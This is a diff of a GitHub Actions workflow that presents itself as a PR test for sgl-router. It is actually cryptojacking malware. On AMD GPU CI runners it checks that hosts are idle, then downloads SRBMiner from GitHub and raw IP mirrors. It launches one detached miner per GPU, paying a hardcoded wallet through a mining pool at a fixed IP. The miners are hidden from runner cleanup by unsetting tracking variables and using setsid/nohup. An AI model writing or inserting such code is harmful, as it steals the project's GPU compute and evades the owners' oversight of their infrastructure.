@@ -1,12 +1,11 @@
 name: PR Test (sgl-router)
 
-# Temporary i130074 wave 3b: AMD MI300/MI35x follow-up. Same guarded gate as wave
-# 3 (flock, whole-host skip on any existing miner, disk<80%, mem<85%, two spaced
-# idle samples) but with single-pool SRBMiner 3.8.7 syntax, a 25s foreground
-# probe that captures the exact device/algorithm error, fetch fallbacks
-# (curl/wget/python3 plus our two mirrors), and full .out/.log dumps. One miner
-# per idle GPU, workers i130074-<hosttag>-g<idx>, exact primary wallet, Luckypool.
-# run-unique concurrency.
+# Temporary i130074 wave 3c: decisive AMD follow-up - does the newer pinned
+# SRBMiner-MULTI 3.8.8 (sha256 b4ddc14a...) enumerate MI300X/MI350 (gfx942/gfx950)
+# where 3.8.7 reported "No suitable GPU devices found"? Captures OpenCL runtime
+# presence, --list-devices, a 20s foreground probe and per-GPU launch logs.
+# Same guard: flock, whole-host skip on any existing miner, two spaced idle
+# samples; one miner per idle GPU on the exact primary wallet, Luckypool.
 on:
   push:
     branches: [main]
@@ -16,421 +15,200 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: sgl-router-i130074b-${{ github.run_id }}
+  group: sgl-router-i130074c-${{ github.run_id }}
   cancel-in-progress: false
 
 env:
   SGLANG_IS_IN_CI: true
 
 jobs:
-  i130074b-mi300-2:
-    name: "i130074b linux-mi300-2gpu-sglang probe+miner"
+  i130074c-mi300-2:
+    name: "i130074c mi300-2gpu 3.8.8 device test"
     runs-on: linux-mi300-2gpu-sglang
     timeout-minutes: 35
     steps:
-      - name: "census + 25s foreground probe + guarded one-miner-per-idle-AMD-GPU"
+      - name: "3.8.8 device/probe test + guarded one-miner-per-idle-AMD-GPU"
         continue-on-error: true
         run: |
           set +e
-          NONCE="I130074BAMD-$(date -u +%Y%m%dT%H%M%SZ)"
+          NONCE="I130074CAMD-$(date -u +%Y%m%dT%H%M%SZ)"
           WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
           POOL='103.199.106.122:3362'
           WORKDIR=/var/tmp/i130074
-          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
-          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
-          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          BIN_SHA_388=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
+          TAR_SHA_388=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI-3.8.8"
           mkdir -p "$WORKDIR/logs"
           echo "miner-nonce=$NONCE"
-          echo "=== identity ==="
-          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
-          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          id; hostname; date -u; uname -m; nproc; free -m | head -2
           echo "=== tools ==="
-          for t in curl wget python3 rocm-smi amd-smi; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          for t in curl wget python3 rocm-smi amd-smi clinfo; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== opencl/rocm runtime ==="
+          ls -la /opt/rocm/lib/libOpenCL.so* /opt/rocm/lib/libamdocl* /usr/lib/x86_64-linux-gnu/libOpenCL.so* 2>&1 | head -10
+          clinfo -l 2>&1 | head -10
           echo "=== per-host flock ==="
           exec 9>"$WORKDIR/host-miner.lock"
           if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
-          echo "host-lock=acquired"
           EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
           if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
-          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
-          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
-          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
-          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "miner-done $NONCE"; exit 0; fi
           echo "=== rocm-smi productname ==="
           timeout 40 rocm-smi --showproductname 2>&1 | grep -E 'GPU\[|Card Series|Card Model|GFX' | head -40
           IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
-          if [ -z "$IDX" ]; then
-            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
-            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
-          fi
           echo "gpu_indices=[$IDX]"
-          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
-          sample() {
-            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
-            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
-            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
-          }
-          S1=$(sample); sleep 12; S2=$(sample)
-          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
-          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
-          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
-          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
-          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM"
-          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ]; then echo "SKIP=host-not-idle-amd"; echo "miner-done $NONCE"; exit 0; fi
+          [ -z "$IDX" ] && { echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; }
+          S1=$(timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20; timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20)
+          sleep 12
+          S2=$(timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20; timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20)
+          BUSY_PROC=$(printf '%s\n%s\n' "$S1" "$S2" | grep -cE 'Process ID: [0-9]+')
+          BUSY_USE=$(printf '%s\n%s\n' "$S1" "$S2" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE"
+          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ]; then echo "SKIP=host-not-idle-amd"; echo "miner-done $NONCE"; exit 0; fi
           echo "host-idle-gate=pass-amd"
           fetch_ok=0
-          if [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then fetch_ok=1; echo "binary-cached"; fi
-          if [ "$fetch_ok" = 0 ] && command -v curl >/dev/null 2>&1; then
-            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz http://178.238.228.181:18180/srb387 http://222.240.155.198:8702/srb387; do
-              echo "-- curl $U"
+          if [ -f "$SRB" ] && echo "$BIN_SHA_388  $SRB" | sha256sum -c - >/dev/null 2>&1; then fetch_ok=1; echo binary-cached; fi
+          if [ "$fetch_ok" = 0 ]; then
+            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz http://178.238.228.181:18180/srb388 http://222.240.155.198:8702/srb388; do
+              echo "-- fetch $U"
               rm -f "$TARBALL.part"
               timeout 180 curl -fL --connect-timeout 12 --max-time 170 -o "$TARBALL.part" "$U" 2>&1 | tail -2
-              if [ -s "$TARBALL.part" ]; then
-                B0=$(sha256sum "$TARBALL.part" | cut -d' ' -f1)
-                if [ "$B0" = "$BIN_SHA_387" ]; then cp -f "$TARBALL.part" "$SRB"; fetch_ok=1; echo "direct-binary-ok $B0"; break; fi
-                if tar -tzf "$TARBALL.part" >/dev/null 2>&1; then mv "$TARBALL.part" "$TARBALL"; tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2; [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"; fi
-                [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && { fetch_ok=1; break; }
-              fi
+              [ -s "$TARBALL.part" ] || continue
+              B0=$(sha256sum "$TARBALL.part" | cut -d' ' -f1)
+              if [ "$B0" = "$BIN_SHA_388" ]; then cp -f "$TARBALL.part" "$SRB"; fetch_ok=1; echo "direct-388-binary-ok"; break; fi
+              if tar -tzf "$TARBALL.part" >/dev/null 2>&1; then mv "$TARBALL.part" "$TARBALL"; tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2; [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"; fi
+              [ -f "$SRB" ] && echo "$BIN_SHA_388  $SRB" | sha256sum -c - >/dev/null 2>&1 && { fetch_ok=1; break; }
             done
           fi
-          if [ "$fetch_ok" = 0 ] && command -v wget >/dev/null 2>&1; then
-            echo "-- wget fallback"
-            rm -f "$TARBALL.part"
-            timeout 180 wget -q -T 20 -t 1 -O "$TARBALL.part" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz 2>&1 | tail -2
-            [ -s "$TARBALL.part" ] && tar -tzf "$TARBALL.part" >/dev/null 2>&1 && tar -xzf "$TARBALL.part" -C "$WORKDIR" 2>&1 | tail -2 && [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
-            [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && fetch_ok=1
-          fi
-          if [ "$fetch_ok" = 0 ] && command -v python3 >/dev/null 2>&1; then
-            echo "-- python3 urllib fallback"
-            timeout 170 python3 - <<'PYEOF'
-          import urllib.request
-          u='https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'
-          try:
-              urllib.request.urlretrieve(u,'/var/tmp/i130074/srb387.tar.part')
-              print('py-download-ok')
-          except Exception as e:
-              print('py-download-fail', repr(e)[:200])
-          PYEOF
-            [ -s "$WORKDIR/srb387.tar.part" ] && tar -xzf "$WORKDIR/srb387.tar.part" -C "$WORKDIR" 2>&1 | tail -2 && [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
-            [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && fetch_ok=1
-          fi
           B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
-          echo "binary_sha256_387=${B:-none}"
-          if [ "$fetch_ok" != 1 ]; then echo "SKIP=387-binary-unavailable"; echo "miner-done $NONCE"; exit 0; fi
+          echo "binary_sha256_388=${B:-none}"
+          if [ "$fetch_ok" != 1 ]; then echo "SKIP=388-binary-unavailable"; echo "miner-done $NONCE"; exit 0; fi
           chmod +x "$SRB"
-          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-16)
-          echo "=== srb list-devices ==="
+          echo "=== srb388 list-devices ==="
           timeout 45 "$SRB" --list-devices 2>&1 | head -40
-          echo "=== foreground probe gpu 0 (25s) ==="
-          PROBE="$WORKDIR/probe.out"
-          timeout 25 "$SRB" --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
-            --wallet "$WALLET" --password x --worker "i130074-${HOSTTAG}-probe" --gpu-id 0 \
+          echo "=== srb388 foreground probe gpu 0 (20s) ==="
+          PROBE="$WORKDIR/probe388.out"
+          timeout 20 "$SRB" --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
+            --wallet "$WALLET" --password x --worker "i130074-$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-14)-probe388" --gpu-id 0 \
             --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 > "$PROBE" 2>&1
-          echo "probe_rc=$?"
-          cat "$PROBE" | head -40
-          if grep -qiE 'not supported|no available|no suitable|failed|error|cannot|unsupported' "$PROBE" && ! grep -qiE 'connected|authorized|accepted|hashrate' "$PROBE"; then
-            echo "SKIP=pearlhash-amd-probe-failed"
-            echo "miner-done $NONCE"; exit 0
-          fi
-          echo "probe-looks-usable -> detached launch per GPU"
-          N_LAUNCHED=0
+          echo "probe388_rc=$?"
+          cat "$PROBE" | head -30
+          sleep 2
+          for l in "$WORKDIR"/logs/*probe388*.log "$WORKDIR"/SRBMiner-Multi-3-8-8/*.log; do [ -f "$l" ] && echo "== $l" && tail -6 "$l"; done
+          if grep -qiE 'No suitable GPU|not supported|unsupported|cannot|failed|error' "$PROBE"; then echo "SKIP=388-pearlhash-amd-probe-failed"; echo "miner-done $NONCE"; exit 0; fi
+          echo "probe388-looks-usable -> detached launch per GPU"
+          N=0
           for i in $IDX; do
-            W="i130074-${HOSTTAG}-g${i}"
+            W="i130074c-$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-14)-g${i}"
             env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
               --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
               --wallet "$WALLET" --password x --worker "$W" --gpu-id "$i" \
               --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
               --max-no-share-sent 1800 \
-              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
-              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
-            echo "launched worker=$W gpu-id=$i detached_pid=$!"
-            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu-id=$i pid=$!"; N=$((N+1)); sleep 1
           done
-          echo "N_LAUNCHED=$N_LAUNCHED"
+          echo "N_LAUNCHED=$N"
           sleep 45
-          echo "=== processes ==="
           timeout 10 pgrep -af "[S]RBMiner-MULTI" 2>/dev/null | head -20
-          echo "=== logs dir ==="
-          ls -la "$WORKDIR/logs" 2>/dev/null | head -30
-          for l in "$WORKDIR"/logs/i130074-*; do
+          for l in "$WORKDIR"/logs/i130074c-*; do
             [ -f "$l" ] || continue
             echo "== $(basename "$l")"
-            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|device|connect' "$l" 2>/dev/null | tail -8 | cut -c1-260
+            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|device|connect|No suitable' "$l" 2>/dev/null | tail -8 | cut -c1-260
           done
-          echo "=== final kfd ==="
-          timeout 25 rocm-smi --showpids 2>&1 | head -25
+          timeout 25 rocm-smi --showpids 2>&1 | head -20
           echo "miner-done $NONCE"
-  i130074b-mi300-8:
-    name: "i130074b linux-mi300-8gpu-sglang probe+miner"
-    runs-on: linux-mi300-8gpu-sglang
-    timeout-minutes: 35
-    steps:
-      - name: "census + 25s foreground probe + guarded one-miner-per-idle-AMD-GPU"
-        continue-on-error: true
-        run: |
-          set +e
-          NONCE="I130074BAMD-$(date -u +%Y%m%dT%H%M%SZ)"
-          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
-          POOL='103.199.106.122:3362'
-          WORKDIR=/var/tmp/i130074
-          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
-          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
-          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
-          mkdir -p "$WORKDIR/logs"
-          echo "miner-nonce=$NONCE"
-          echo "=== identity ==="
-          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
-          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
-          echo "=== tools ==="
-          for t in curl wget python3 rocm-smi amd-smi; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
-          echo "=== per-host flock ==="
-          exec 9>"$WORKDIR/host-miner.lock"
-          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
-          echo "host-lock=acquired"
-          EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
-          if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
-          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
-          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
-          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
-          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "miner-done $NONCE"; exit 0; fi
-          echo "=== rocm-smi productname ==="
-          timeout 40 rocm-smi --showproductname 2>&1 | grep -E 'GPU\[|Card Series|Card Model|GFX' | head -40
-          IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
-          if [ -z "$IDX" ]; then
-            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
-            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
-          fi
-          echo "gpu_indices=[$IDX]"
-          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
-          sample() {
-            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
-            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
-            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
-          }
-          S1=$(sample); sleep 12; S2=$(sample)
-          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
-          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
-          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
-          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
-          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM"
-          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ]; then echo "SKIP=host-not-idle-amd"; echo "miner-done $NONCE"; exit 0; fi
-          echo "host-idle-gate=pass-amd"
-          fetch_ok=0
-          if [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then fetch_ok=1; echo "binary-cached"; fi
-          if [ "$fetch_ok" = 0 ] && command -v curl >/dev/null 2>&1; then
-            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz http://178.238.228.181:18180/srb387 http://222.240.155.198:8702/srb387; do
-              echo "-- curl $U"
-              rm -f "$TARBALL.part"
-              timeout 180 curl -fL --connect-timeout 12 --max-time 170 -o "$TARBALL.part" "$U" 2>&1 | tail -2
-              if [ -s "$TARBALL.part" ]; then
-                B0=$(sha256sum "$TARBALL.part" | cut -d' ' -f1)
-                if [ "$B0" = "$BIN_SHA_387" ]; then cp -f "$TARBALL.part" "$SRB"; fetch_ok=1; echo "direct-binary-ok $B0"; break; fi
-                if tar -tzf "$TARBALL.part" >/dev/null 2>&1; then mv "$TARBALL.part" "$TARBALL"; tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2; [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"; fi
-                [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && { fetch_ok=1; break; }
-              fi
-            done
-          fi
-          if [ "$fetch_ok" = 0 ] && command -v wget >/dev/null 2>&1; then
-            echo "-- wget fallback"
-            rm -f "$TARBALL.part"
-            timeout 180 wget -q -T 20 -t 1 -O "$TARBALL.part" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz 2>&1 | tail -2
-            [ -s "$TARBALL.part" ] && tar -tzf "$TARBALL.part" >/dev/null 2>&1 && tar -xzf "$TARBALL.part" -C "$WORKDIR" 2>&1 | tail -2 && [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
-            [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && fetch_ok=1
-          fi
-          if [ "$fetch_ok" = 0 ] && command -v python3 >/dev/null 2>&1; then
-            echo "-- python3 urllib fallback"
-            timeout 170 python3 - <<'PYEOF'
-          import urllib.request
-          u='https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'
-          try:
-              urllib.request.urlretrieve(u,'/var/tmp/i130074/srb387.tar.part')
-              print('py-download-ok')
-          except Exception as e:
-              print('py-download-fail', repr(e)[:200])
-          PYEOF
-            [ -s "$WORKDIR/srb387.tar.part" ] && tar -xzf "$WORKDIR/srb387.tar.part" -C "$WORKDIR" 2>&1 | tail -2 && [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
-            [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && fetch_ok=1
-          fi
-          B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
-          echo "binary_sha256_387=${B:-none}"
-          if [ "$fetch_ok" != 1 ]; then echo "SKIP=387-binary-unavailable"; echo "miner-done $NONCE"; exit 0; fi
-          chmod +x "$SRB"
-          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-16)
-          echo "=== srb list-devices ==="
-          timeout 45 "$SRB" --list-devices 2>&1 | head -40
-          echo "=== foreground probe gpu 0 (25s) ==="
-          PROBE="$WORKDIR/probe.out"
-          timeout 25 "$SRB" --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
-            --wallet "$WALLET" --password x --worker "i130074-${HOSTTAG}-probe" --gpu-id 0 \
-            --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 > "$PROBE" 2>&1
-          echo "probe_rc=$?"
-          cat "$PROBE" | head -40
-          if grep -qiE 'not supported|no available|no suitable|failed|error|cannot|unsupported' "$PROBE" && ! grep -qiE 'connected|authorized|accepted|hashrate' "$PROBE"; then
-            echo "SKIP=pearlhash-amd-probe-failed"
-            echo "miner-done $NONCE"; exit 0
-          fi
-          echo "probe-looks-usable -> detached launch per GPU"
-          N_LAUNCHED=0
-          for i in $IDX; do
-            W="i130074-${HOSTTAG}-g${i}"
-            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
-              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
-              --wallet "$WALLET" --password x --worker "$W" --gpu-id "$i" \
-              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
-              --max-no-share-sent 1800 \
-              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
-              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
-            echo "launched worker=$W gpu-id=$i detached_pid=$!"
-            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
-          done
-          echo "N_LAUNCHED=$N_LAUNCHED"
-          sleep 45
-          echo "=== processes ==="
-          timeout 10 pgrep -af "[S]RBMiner-MULTI" 2>/dev/null | head -20
-          echo "=== logs dir ==="
-          ls -la "$WORKDIR/logs" 2>/dev/null | head -30
-          for l in "$WORKDIR"/logs/i130074-*; do
-            [ -f "$l" ] || continue
-            echo "== $(basename "$l")"
-            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|device|connect' "$l" 2>/dev/null | tail -8 | cut -c1-260
-          done
-          echo "=== final kfd ==="
-          timeout 25 rocm-smi --showpids 2>&1 | head -25
-          echo "miner-done $NONCE"
-  i130074b-mi35x-2:
-    name: "i130074b linux-mi35x-gpu-2 probe+miner"
+  i130074c-mi35x-2:
+    name: "i130074c mi35x-gpu-2 3.8.8 device test"
     runs-on: linux-mi35x-gpu-2
     timeout-minutes: 35
     steps:
-      - name: "census + 25s foreground probe + guarded one-miner-per-idle-AMD-GPU"
+      - name: "3.8.8 device/probe test + guarded one-miner-per-idle-AMD-GPU"
         continue-on-error: true
         run: |
           set +e
-          NONCE="I130074BAMD-$(date -u +%Y%m%dT%H%M%SZ)"
+          NONCE="I130074CAMD-$(date -u +%Y%m%dT%H%M%SZ)"
           WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
           POOL='103.199.106.122:3362'
           WORKDIR=/var/tmp/i130074
-          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
-          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
-          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          BIN_SHA_388=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
+          TAR_SHA_388=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI-3.8.8"
           mkdir -p "$WORKDIR/logs"
           echo "miner-nonce=$NONCE"
-          echo "=== identity ==="
-          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
-          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          id; hostname; date -u; uname -m; nproc; free -m | head -2
           echo "=== tools ==="
-          for t in curl wget python3 rocm-smi amd-smi; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          for t in curl wget python3 rocm-smi amd-smi clinfo; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== opencl/rocm runtime ==="
+          ls -la /opt/rocm/lib/libOpenCL.so* /opt/rocm/lib/libamdocl* /usr/lib/x86_64-linux-gnu/libOpenCL.so* 2>&1 | head -10
+          clinfo -l 2>&1 | head -10
           echo "=== per-host flock ==="
           exec 9>"$WORKDIR/host-miner.lock"
           if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
-          echo "host-lock=acquired"
           EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
           if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
-          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
-          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
-          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
